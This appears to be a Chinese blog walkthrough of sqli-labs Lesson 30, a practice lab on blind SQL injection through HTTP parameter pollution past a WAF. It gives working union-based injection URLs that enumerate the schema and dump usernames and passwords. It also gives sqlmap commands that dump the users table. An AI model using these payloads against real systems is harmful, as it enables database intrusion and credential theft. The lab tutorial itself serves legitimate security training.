---
title: sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用
date: 2018-10-14 16:31:10
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-30 GET基于盲注-阻抗不匹配-有WAF的web应用

---

## 登录界面

![001](/img/sql/Lesson-30/001.png)

## 分析

真正有WAF的页面是login.php,根据题目来做的话要把这行代码注释掉,不使用报错。

![002](/img/sql/Lesson-30/002.png)

过滤都和Lesson-29一样,只是这里用双引号闭合，需要把显示账号密码注释后的再改改弄的像Lesson-8才是布尔型盲注。

这里太麻烦了没弄。

## 手注

### 获取字段数

`http://192.168.75.133/sql/Less-30/login.php?id=1&id=2" order by 4%23`

![003](/img/sql/Lesson-30/003.png)

`http://192.168.75.133/sql/Less-30/login.php?id=1&id=2" order by 4%23`

![004](/img/sql/Lesson-30/004.png)

### 获取数据库

`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2"union select 1,2,3%23`

![005](/img/sql/Lesson-30/005.png)

`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2"union select 1,database(),3%23`

![006](/img/sql/Lesson-30/006.png)

### 获取表名

`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2"union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='security'),3%23`

![007](/img/sql/Lesson-30/007.png)

### 获取列名

`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2"union select 1,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),3%23`

![008](/img/sql/Lesson-30/008.png)

### 获取字段

`http://192.168.75.133/sql/Less-30/login.php?id=1&id=-2"union select 1,(select group_concat(username,'~',password) from security.users),3%23`

![009](/img/sql/Lesson-30/009.png)

## SQLMAP

```
--technique B:检查布尔型注入
--dbms 10：后端数据库设置为mysql
--flush-session:刷新session
--fresh-queries:发起新查询
-v 2：显示测试过程
```

`sqlmap -u "http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*" --technique B --dbms mysql --level 2 -v 2`

![010](/img/sql/Lesson-30/010.png)

![011](/img/sql/Lesson-30/011.png)

`sqlmap -u "http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*" --technique B --dbms mysql --dbs --threads 10`

![012](/img/sql/Lesson-30/012.png)

`sqlmap -u "http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*" --technique B mysql -D security --tables --threads 10`

![013](/img/sql/Lesson-30/013.png)

`sqlmap -u "http://192.168.75.133/sql/Less-30/login.php?id=1&id=2*" --technique B mysql -D security -T users --columns --dump --threads 10`

![014](/img/sql/Lesson-30/014.png)